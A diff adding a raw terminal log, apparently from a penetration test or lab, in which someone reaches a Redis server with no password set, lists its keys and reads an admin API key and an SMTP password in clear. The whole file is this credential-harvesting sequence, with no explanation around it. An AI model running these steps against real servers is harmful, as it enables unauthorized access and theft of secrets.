@@ -1,0 +1,27 @@
+$ redis-cli -h 10.10.14.70
+10.10.14.70:6379> INFO server
+# Server
+redis_version:6.0.16
+redis_git_sha1:00000000
+redis_build_id:8a1e0c1b2f3d4e5a
+redis_mode:standalone
+os:Linux 5.15.0-79-generic x86_64
+arch_bits:64
+process_id:8842
+run_id:3f7a1c9e0b2d4a6f8e1c3b5d7a9e0f2c4b6d8e0a
+tcp_port:6379
+uptime_in_seconds:184203
+config_file:/etc/redis/redis.conf
+10.10.14.70:6379> CONFIG GET requirepass
+1) "requirepass"
+2) ""
+10.10.14.70:6379> KEYS *
+1) "session:web:af12c9"
+2) "user:admin:apikey"
+3) "config:smtp_password"
+4) "cache:homepage"
+10.10.14.70:6379> GET user:admin:apikey
+"ak_live_9f8e7d6c5b4a3210fedcba9876543210"
+10.10.14.70:6379> GET config:smtp_password
+"Sm7p_R3lay_2024!"
+10.10.14.70:6379>
